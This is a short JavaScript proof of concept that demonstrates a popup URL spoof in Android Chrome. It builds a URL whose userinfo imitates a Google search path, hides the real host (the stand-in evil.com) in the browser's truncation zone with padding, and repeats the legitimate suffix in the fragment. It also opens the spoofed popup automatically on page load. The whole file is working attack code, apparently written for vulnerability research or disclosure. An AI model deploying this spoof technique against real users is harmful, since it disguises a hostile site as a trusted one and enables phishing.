// Popup URL Spoof POC — Android Chrome

// === TEST 1: Legit Google URL ===
document.getElementById('btnLegit').addEventListener('click', function() {
  // Use setTimeout so popup fires outside user gesture → blocked
  setTimeout(function() {
    window.open('https://www.google.com/search?q=what+is+claude', '_blank');
  }, 600);
});

// === TEST 2: Spoofed URL ===
// Crafted so popup dialog shows same prefix+suffix as legit URL
// Real host (evil.com) hidden in truncation zone
document.getElementById('btnSpoof').addEventListener('click', function() {
  setTimeout(function() {
    // Userinfo = www.google.com/search?q=what+is+claude (looks like legit path)
    // Host = evil.com (HIDDEN in truncation)
    // Path padding = pushes suffix to match legit
    // Fragment = #search?q=what+is+claude (matches legit suffix)
    var url = 'https://www.google.com/search?q=what+is+claude@evil.com' +
              '/' + 'x'.repeat(60) +
              '#search?q=what+is+claude';
    window.open(url, '_blank');
  }, 600);
});

// === Auto-trigger demo: opens both popups on page load ===
// Both popups blocked → user can compare in popup UI
setTimeout(function() {
  // Legit
  window.open('https://www.google.com/search?q=what+is+claude', '_blank');

  // Spoofed
  var spoof = 'https://www.google.com/search?q=what+is+claude@evil.com' +
              '/' + 'x'.repeat(60) +
              '#search?q=what+is+claude';
  window.open(spoof, '_blank');
}, 2000);
